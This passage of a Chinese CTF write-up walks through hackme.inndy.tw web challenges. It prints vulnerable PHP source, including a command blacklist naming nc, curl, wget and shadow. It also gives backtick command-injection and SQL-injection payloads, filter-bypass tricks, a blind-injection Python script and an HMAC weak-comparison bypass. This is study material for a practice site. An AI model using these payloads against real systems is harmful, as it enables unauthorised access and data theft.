+<p><img src="https://img-blog.csdnimg.cn/20190914003705131.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70"></p>
+<p><img src="https://img-blog.csdnimg.cn/20190914113210832.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70"></p>
+<h3 id="知识扩展-1"><a href="#知识扩展-1" class="headerlink" title="知识扩展"></a>知识扩展</h3><ul>
+<li>LFI（文件包含攻击）<br><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/8803aff98bfa">https://www.jianshu.com/p/8803aff98bfa</a></li>
+</ul>
+<h2 id="4-homepage"><a href="#4-homepage" class="headerlink" title="4 homepage"></a>4 homepage</h2><blockquote>
+<p>Where is the flag? Did you check the code?</p>
+</blockquote>
+<p>点击题目链接后出现Start Hacking Now，于是便像以前的Web解题思路一样，先按F12看看，不想在Console下发现一张二维码</p>
+<p><img src="https://img-blog.csdnimg.cn/20190913182854129.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70"></p>
+<p>扫一下就出现了flag</p>
+<p><img src="https://img-blog.csdnimg.cn/20190913182918736.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70"></p>
+<h2 id="5-ping"><a href="#5-ping" class="headerlink" title="5 ping"></a>5 ping</h2><blockquote>
+<p>Can you ping 127.0.0.1?</p>
+</blockquote>
+<p>打开网页后发现其源代码如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">    &lt;!DOCTYPE html&gt;</span><br><span class="line">    &lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">        &lt;title&gt;Ping&lt;/title&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;form action=&quot;.&quot; method=&quot;GET&quot;&gt;</span><br><span class="line">            IP: &lt;input type=&quot;text&quot; name=&quot;ip&quot;&gt; &lt;input type=&quot;submit&quot; value=&quot;Ping&quot;&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">        &lt;pre&gt;&lt;?php</span><br><span class="line">            $blacklist = [</span><br><span class="line">                &#x27;flag&#x27;, &#x27;cat&#x27;, &#x27;nc&#x27;, &#x27;sh&#x27;, &#x27;cp&#x27;, &#x27;touch&#x27;, &#x27;mv&#x27;, &#x27;rm&#x27;, &#x27;ps&#x27;, &#x27;top&#x27;, &#x27;sleep&#x27;, &#x27;sed&#x27;,</span><br><span class="line">                &#x27;apt&#x27;, &#x27;yum&#x27;, &#x27;curl&#x27;, &#x27;wget&#x27;, &#x27;perl&#x27;, &#x27;python&#x27;, &#x27;zip&#x27;, &#x27;tar&#x27;, &#x27;php&#x27;, &#x27;ruby&#x27;, &#x27;kill&#x27;,</span><br><span class="line">                &#x27;passwd&#x27;, &#x27;shadow&#x27;, &#x27;root&#x27;,</span><br><span class="line">                &#x27;z&#x27;,</span><br><span class="line">                &#x27;dir&#x27;, &#x27;dd&#x27;, &#x27;df&#x27;, &#x27;du&#x27;, &#x27;free&#x27;, &#x27;tempfile&#x27;, &#x27;touch&#x27;, &#x27;tee&#x27;, &#x27;sha&#x27;, &#x27;x64&#x27;, &#x27;g&#x27;,</span><br><span class="line">                &#x27;xargs&#x27;, &#x27;PATH&#x27;,</span><br><span class="line">                &#x27;$0&#x27;, &#x27;proc&#x27;,</span><br><span class="line">                &#x27;/&#x27;, &#x27;&amp;&#x27;, &#x27;|&#x27;, &#x27;&gt;&#x27;, &#x27;&lt;&#x27;, &#x27;;&#x27;, &#x27;&quot;&#x27;, &#x27;\&#x27;&#x27;, &#x27;\\&#x27;, &quot;\n&quot;</span><br><span class="line">            ];</span><br><span class="line">        set_time_limit(2);</span><br><span class="line"></span><br><span class="line">        function ping($ip) &#123;</span><br><span class="line">            global $blacklist;</span><br><span class="line"></span><br><span class="line">            if(strlen($ip) &gt; 15) &#123;</span><br><span class="line">                return &#x27;IP toooooo longgggggggggg&#x27;;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                foreach($blacklist as $keyword) &#123;</span><br><span class="line">                    if(strstr($ip, $keyword)) &#123;</span><br><span class="line">                        return &quot;&#123;$keyword&#125; not allowed&quot;;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                $ret = [];</span><br><span class="line">                exec(&quot;ping -c 1 \&quot;&#123;$ip&#125;\&quot; 2&gt;&amp;1&quot;, $ret);</span><br><span class="line">                return implode(&quot;\n&quot;, array_slice($ret, 0, 10));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if(!empty($_GET[&#x27;ip&#x27;]))</span><br><span class="line">            echo htmlentities(ping($_GET[&#x27;ip&#x27;]));</span><br><span class="line">        else</span><br><span class="line">            highlight_file(__FILE__);</span><br><span class="line">    ?&gt;&lt;/pre&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>程序在$blacklist里面过滤了很多东西，但是还是可以用“两个反引号来绕过限制执行系统命令，所以，首先输入`ls`来查看目录，发现报错信息里面提示了有index.php和flag.php   </p>
+
+<p><img src="https://img-blog.csdnimg.cn/20190914105945963.png"></p>
+<p>所以flag一定是在flag.php里面了，所以要尝试去读取flag.php，但是cat，flag和php被禁掉了，所以要用tail来读取flag.php，所以就要用通配符来读取，所以最后的payload是：`tail fl*.ph*`,最终得到了flag  </p>
+
+<p><img src="https://img-blog.csdnimg.cn/20190914110117959.png"></p>
+<h3 id="知识扩展-2"><a href="#知识扩展-2" class="headerlink" title="知识扩展"></a>知识扩展</h3><ul>
+<li>Linux通配符<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/magi1201/article/details/76065370">https://blog.csdn.net/magi1201/article/details/76065370</a></li>
+<li>php代码审计</li>
+</ul>
+<h2 id="6-scoreboard"><a href="#6-scoreboard" class="headerlink" title="6 scoreboard"></a>6 scoreboard</h2><blockquote>
+<p>DO NOT ATTACK or SCAN scoreboard, you don’t need to do that.</p>
+</blockquote>
+<p>题目描述说别让我们攻击或者扫描网页，所以就不搞破坏了<br>打开题目链接后习惯性地按F12，最终在Network的Headers中找到了flag</p>
+<p><img src="https://img-blog.csdnimg.cn/20190914110825157.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70"></p>
+<h2 id="7-login-as-admin-0"><a href="#7-login-as-admin-0" class="headerlink" title="7 login as admin 0"></a>7 login as admin 0</h2><blockquote>
+<p>SQL Injection!</p>
+</blockquote>
+<p>提示说用sql注入，进入题目点击Source Code，出现如下源代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">require(&#x27;config.php&#x27;);</span><br><span class="line"></span><br><span class="line">// table schema</span><br><span class="line">// user -&gt; id, user, password, is_admin</span><br><span class="line"></span><br><span class="line">if($_GET[&#x27;show_source&#x27;] === &#x27;1&#x27;) &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function safe_filter($str)</span><br><span class="line">&#123;</span><br><span class="line">    $strl = strtolower($str);</span><br><span class="line">    if (strstr($strl, &#x27;or 1=1&#x27;) || strstr($strl, &#x27;drop&#x27;) ||</span><br><span class="line">        strstr($strl, &#x27;update&#x27;) || strstr($strl, &#x27;delete&#x27;)</span><br><span class="line">    ) &#123;</span><br><span class="line">        return &#x27;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    return str_replace(&quot;&#x27;&quot;, &quot;\\&#x27;&quot;, $str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_POST = array_map(safe_filter, $_POST);</span><br><span class="line"></span><br><span class="line">$user = null;</span><br><span class="line"></span><br><span class="line">// connect to database</span><br><span class="line"></span><br><span class="line">if(!empty($_POST[&#x27;name&#x27;]) &amp;&amp; !empty($_POST[&#x27;password&#x27;])) &#123;</span><br><span class="line">    $connection_string = sprintf(&#x27;mysql:host=%s;dbname=%s;charset=utf8mb4&#x27;, DB_HOST, DB_NAME);</span><br><span class="line">    $db = new PDO($connection_string, DB_USER, DB_PASS);</span><br><span class="line">    $sql = sprintf(&quot;SELECT * FROM `user` WHERE `user` = &#x27;%s&#x27; AND `password` = &#x27;%s&#x27;&quot;,</span><br><span class="line">        $_POST[&#x27;name&#x27;],</span><br><span class="line">        $_POST[&#x27;password&#x27;]</span><br><span class="line">    );</span><br><span class="line">    try &#123;</span><br><span class="line">        $query = $db-&gt;query($sql);</span><br><span class="line">        if($query) &#123;</span><br><span class="line">            $user = $query-&gt;fetchObject();</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $user = false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; catch(Exception $e) &#123;</span><br><span class="line">        $user = false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;Login As Admin 0&lt;/title&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;</span><br><span class="line">    &lt;link rel=&quot;stylesheet&quot; href=&quot;/bootstrap/css/bootstrap.min.css&quot; media=&quot;all&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div class=&quot;jumbotron&quot;&gt;</span><br><span class="line">        &lt;div class=&quot;container&quot;&gt;</span><br><span class="line">            &lt;h1&gt;Login as Admin 0&lt;/h1&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">    &lt;div class=&quot;container&quot;&gt;</span><br><span class="line">        &lt;div class=&quot;navbar&quot;&gt;</span><br><span class="line">            &lt;div class=&quot;container-fluid&quot;&gt;</span><br><span class="line">                &lt;div class=&quot;navbar-header&quot;&gt;</span><br><span class="line">                    &lt;a class=&quot;navbar-brand&quot; href=&quot;/&quot;&gt;Please Hack Me&lt;/a&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">                &lt;ul class=&quot;nav navbar-nav&quot;&gt;</span><br><span class="line">                    &lt;li&gt;</span><br><span class="line">                        &lt;a href=&quot;/scoreboard&quot;&gt;Scoreboard&lt;/a&gt;</span><br><span class="line">                    &lt;/li&gt;</span><br><span class="line">                    &lt;li&gt;</span><br><span class="line">                        &lt;a href=&quot;?show_source=1&quot; target=&quot;_blank&quot;&gt;Source Code&lt;/a&gt;</span><br><span class="line">                    &lt;/li&gt;</span><br><span class="line">                &lt;/ul&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">    &lt;div class=&quot;container&quot;&gt;</span><br><span class="line">        &lt;div class=&quot;col-md-6 col-md-offset-3&quot;&gt;</span><br><span class="line">&lt;?php if(!$user): ?&gt;</span><br><span class="line">&lt;?php if($user === false): ?&gt;</span><br><span class="line">            &lt;!-- debug: &lt;?=$sql?&gt; --&gt;</span><br><span class="line">            &lt;div class=&quot;alert alert-danger&quot;&gt;Login failed&lt;/div&gt;</span><br><span class="line">&lt;?php endif; ?&gt;</span><br><span class="line">            &lt;form action=&quot;.&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">                &lt;div class=&quot;form-group&quot;&gt;</span><br><span class="line">                    &lt;label for=&quot;name&quot;&gt;User:&lt;/label&gt;</span><br><span class="line">                    &lt;input id=&quot;name&quot; class=&quot;form-control&quot; type=&quot;text&quot; name=&quot;name&quot; placeholder=&quot;User&quot;&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">                &lt;div class=&quot;form-group&quot;&gt;</span><br><span class="line">                    &lt;label for=&quot;password&quot;&gt;Pass:&lt;/label&gt;</span><br><span class="line">                    &lt;input id=&quot;password&quot; class=&quot;form-control&quot; type=&quot;text&quot; name=&quot;password&quot; placeholder=&quot;Password&quot;&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">                &lt;div class=&quot;form-group&quot;&gt;</span><br><span class="line">                    &lt;input class=&quot;form-control btn btn-primary&quot; type=&quot;submit&quot; value=&quot;Login&quot;&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">            &lt;/form&gt;</span><br><span class="line"></span><br><span class="line">            &lt;div&gt;</span><br><span class="line">                &lt;p&gt;</span><br><span class="line">                    You can login with &lt;code&gt;guest&lt;/code&gt; / &lt;code&gt;guest&lt;/code&gt;.</span><br><span class="line">                &lt;/p&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">&lt;?php else: ?&gt;</span><br><span class="line">            &lt;h3&gt;Hi, &lt;?=htmlentities($user-&gt;user)?&gt;&lt;/h3&gt;</span><br><span class="line"></span><br><span class="line">            &lt;h4&gt;&lt;?=sprintf(&quot;You %s admin!&quot;, $user-&gt;is_admin ? &quot;are&quot; : &quot;are not&quot;)?&gt;&lt;/h4&gt;</span><br><span class="line"></span><br><span class="line">            &lt;?php if($user-&gt;is_admin) printf(&quot;&lt;code&gt;%s&lt;/code&gt;, %s&quot;, htmlentities($flag1), $where_is_flag2); ?&gt;</span><br><span class="line">&lt;?php endif; ?&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>代码中的注释提示我们用admin登录</p>
+<p><img src="https://img-blog.csdnimg.cn/20190914121925691.png"></p>
+<p>题目中的过滤函数如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function safe_filter($str)</span><br><span class="line">&#123;</span><br><span class="line">    $strl = strtolower($str);</span><br><span class="line">    if (strstr($strl, &#x27;or 1=1&#x27;) || strstr($strl, &#x27;drop&#x27;) ||</span><br><span class="line">        strstr($strl, &#x27;update&#x27;) || strstr($strl, &#x27;delete&#x27;)</span><br><span class="line">    ) &#123;</span><br><span class="line">        return &#x27;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    return str_replace(&quot;&#x27;&quot;, &quot;\\&#x27;&quot;, $str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>易知题目过滤了 <code>or 1=1</code> 等字符，还会用反斜杠转义单引号，漏洞点就在于本题只转义引号，不转义其它字符，所以我们可以考虑用自己提交的反斜杠转义掉引号前面的反斜杠，这样引号就被脱出来了，于是我们可以成功闭合，另外由于题目转义了引号，我们在构造admin登录的时候，可以使用16进制绕过，最终payload如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=guest\&#x27; or user=0x61646d696e-- +&amp; password=guest</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20190914122213285.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70"></p>
+<h3 id="知识扩展-3"><a href="#知识扩展-3" class="headerlink" title="知识扩展"></a>知识扩展</h3><ul>
+<li>mysql语句的使用<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/xiazdong/article/details/7368576">https://blog.csdn.net/xiazdong/article/details/7368576</a></li>
+<li>payload解释<br>0x61646d696e是16进制数，转换成字符后就是admin</li>
+<li>mysql 注释方法</li>
+</ul>
+<ol>
+<li><p>#</p> 最普通的单行注释,实际渗透中最好用之前用url编码下,效果会更好,编码后的值为 %23</li>
+<li><p>-- -</p>            注意中间的空格哦</li>
+<li><p>-- +</p>        </li>
+<li><p>` `</p>            在bypass一些比较老的waf可能还会有些用</li>
+<li><p>/* */</p>        常规内联注释</li>
+<li><p>/* ! */</p></li>
+<li><p>/* !50000 */ </p>   mysql 5通用,带版本内联注释</li>
+</ol>
+<h2 id="8-login-as-admin-0-1"><a href="#8-login-as-admin-0-1" class="headerlink" title="8 login as admin 0.1"></a>8 login as admin 0.1</h2><blockquote>
+<p>Grab the hidden flag</p>
+</blockquote>
+<p>猛一看这一题与上一题一样，可是在上一题的flag后面有两句话说flag2在数据库中，所以第二题其实是注入去数据库找flag</p>
+<p><img src="https://img-blog.csdnimg.cn/20190914123139239.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70"></p>
+<p>于是开始查询数据库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=guest\&#x27; union select 1,2,3,database()#</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/2019091419120180.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70"></p>
+<p>发现没有反应，我就觉得这里应该是要盲注了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`name=guest\&#x27; union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database(`)#</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20190914192527170.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70"></p>
+<p>感觉发现了新大陆貌似爆出了表名，再使用下面的命令得到flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=guest\&#x27; union  select 1,the_f14g,3,4 from h1dden_f14g#</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20190914192820267.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70"></p>
+<h2 id="9-login-as-admin-1"><a href="#9-login-as-admin-1" class="headerlink" title="9 login as admin 1"></a>9 login as admin 1</h2><blockquote>
+<p>Please login as admin.<br>Tips: SQL Injection but sqlmap not working anymore.<br>Update: Source code is available now.<br>Scanner WON’T WORK</p>
+</blockquote>
+<p>题目提示我们以admin身份登录，还是sql注入，但是sqlmap不起作用，而且不用扫描，但是源码可用，于是就看看源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function safe_filter($str)</span><br><span class="line">&#123;</span><br><span class="line">    $strl = strtolower($str);</span><br><span class="line">    if (strstr($strl, &#x27; &#x27;) || strstr($strl, &#x27;1=1&#x27;) || strstr($strl, &quot;&#x27;&#x27;&quot;) ||</span><br><span class="line">        strstr($strl, &#x27;union select&#x27;) || strstr($strl, &#x27;select &#x27;)</span><br><span class="line">    ) &#123;</span><br><span class="line">        return &#x27;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    return str_replace(&quot;&#x27;&quot;, &quot;\\&#x27;&quot;, $str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>感觉跟login as admin 0差不多，但是过滤了<code>空格</code>，<code>&#39;1=1&#39;</code>，<code>&#39;&#39;</code>，<code>union select</code>和<code>select加空格</code> 的形式，于是用下面的命令绕过即可得到flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=admin\&#x27;/**/union/**/select/**/1,2,3,4/**/#</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20190914194841713.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70"></p>
+<h3 id="知识扩展-4"><a href="#知识扩展-4" class="headerlink" title="知识扩展"></a>知识扩展</h3><ul>
+<li>空格绕过<blockquote>
+%09 TAB键（水平）    <br>
+/**/    <br>
+%0a 新建一行    <br>
+%0c 新的一页    <br>
+%0d return功能    <br>
+%0b TAB键（垂直）    <br>
+%a0 空格    <br>
+</blockquote></li>
+<li>单引号绕过\‘</li>
+</ul>
+<h2 id="10-login-as-admin-1-2"><a href="#10-login-as-admin-1-2" class="headerlink" title="10 login as admin 1.2"></a>10 login as admin 1.2</h2><blockquote>
+<p>Get another flag<br>Tips: boolean-based SQL injection, information_schema</p>
+</blockquote>
+<p>这题提示我们进行盲注，进行布尔注入就行了，这题如果正确的话，会回显Hi，再加上原来的注入语句，否则返回login failed</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &quot;https://hackme.inndy.tw/login1/index.php&quot;</span><br><span class="line">length = 1</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">payload1 = r&quot;guest\&#x27;/**/union/**/select/**/1=7,2=5,3=9,(ascii(substr((select/**/group_concat(4a391a11cfa831ca740cf8d00782f3a6)/**/from/**/0bdb54c98123f5526ccaed982d2006a9),&#123;&#125;,1))=&#123;&#125;)#&quot;</span><br><span class="line">data = &#123;&#x27;name&#x27;:r&quot;guest\&#x27;/**/union/**/select/**/1=7,2=5,3=9,(ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;)#&quot;, &#x27;password&#x27;:&quot;123&quot;&#125;</span><br><span class="line">for i in range(0,70):</span><br><span class="line">	for j in range(32,128):</span><br><span class="line">		data[&#x27;name&#x27;] = payload1.format(str(length),str(j))</span><br><span class="line">		content = requests.post(url,data=data).text</span><br><span class="line">		if &quot;FLAG&quot; in content:</span><br><span class="line">			flag += chr(j)</span><br><span class="line">			print(&#x27;**flag:**&#x27;,flag)</span><br><span class="line">			length += 1</span><br><span class="line">			break</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20190914214419630.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70"></p>
+<p>But，我跑了半小时，也没跑出flag，就出来这么一点，枯了</p>
+<h2 id="11-login-as-admin-3"><a href="#11-login-as-admin-3" class="headerlink" title="11 login as admin 3"></a>11 login as admin 3</h2><blockquote>
+<p>login as admin</p>
+</blockquote>
+<p>想要爆出flag，cookie中的$user[‘admin’] 要为true</p>
+<p><img src="https://img-blog.csdnimg.cn/20190914225043997.png"></p>
+<p>在下面的load_user()函数中，我们发现验证登录的方式是!&#x3D;，于是就想到了php弱比较，我们需要构造sig&#x3D;0，即可轻松绕过消息认证码检测:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hash_hmac(&#x27;sha512&#x27;, $unserialized[&#x27;data&#x27;], $secret) != $unserialized[&#x27;sig&#x27;]</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20190914225850704.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70"></p>
+<p>执行下面的php代码后即可得到构造的payload</p>
